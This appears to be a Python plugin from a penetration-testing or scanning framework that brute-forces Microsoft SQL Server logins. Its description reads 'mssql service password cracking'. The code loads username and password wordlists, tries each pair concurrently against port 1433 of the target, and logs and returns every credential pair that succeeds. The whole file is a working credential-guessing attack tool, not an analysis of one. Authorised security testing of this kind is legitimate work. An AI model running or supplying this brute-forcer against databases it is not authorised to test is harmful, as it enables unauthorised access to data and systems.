# -*-* coding:UTF-8
import os
import pymssql


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "mssql服务口令破解",
        "datetime": "2022-01-02"
    }

    def ip(self) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for username, password in self.build_login_dict(
                    method=self.target.args.method,
                    username=self.target.args.username or os.path.join('data', 'mssql_username'),
                    password=self.target.args.password or os.path.join('data', 'mssql_password'),
            ):
                execute.submit(self.task, username, password)
            return {'LoginInfo': execute.result()}

    async def task(self, username, password):
        self.log.debug(f'Login => username: {username}, password: {password}')
        conn = pymssql.connect(
            host=self.target.value,
            port=1433,
            user=username,
            password=password,
            database="master",
            timeout=self.target.args.timeout,
            charset="utf8"
        )
        conn.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 1433,
            'server': 'mssql',
            'username': username,
            'password': password
        }
